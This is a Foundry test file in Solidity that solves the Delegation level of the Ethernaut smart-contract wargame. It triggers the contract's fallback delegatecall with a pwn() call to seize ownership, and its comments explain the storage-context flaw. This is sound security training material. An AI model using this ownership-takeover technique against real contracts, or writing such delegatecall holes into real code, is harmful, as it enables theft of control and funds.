// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/Ethernaut.sol";
import "../src/levels/06-DelegationFactory.sol";

contract DelegationHackTest is Test {
    Ethernaut ethernaut;
    address attacker = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 wei);
    }

    function testDelegationHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DelegationFactory factory = new DelegationFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(factory);
        Delegation delegationContract = Delegation(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        // `delegateCall` would be using the execution context of `Delegate` contract
        // but still using the data/storage of `Delegation` contract
        // When we call `pwn()` on the `Delegation` contract, it would trigger `fallback()`
        // `fallback()` would then trigger `delegateCall` that would forward to the `pwn()` function in `Delegate` contract
        // Thus, changing the owner to attacker
        (bool isSuccessful, ) = address(delegationContract).call(
            abi.encodeWithSignature("pwn()")
        );
        assertTrue(isSuccessful);
        assertEq(delegationContract.owner(), attacker);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
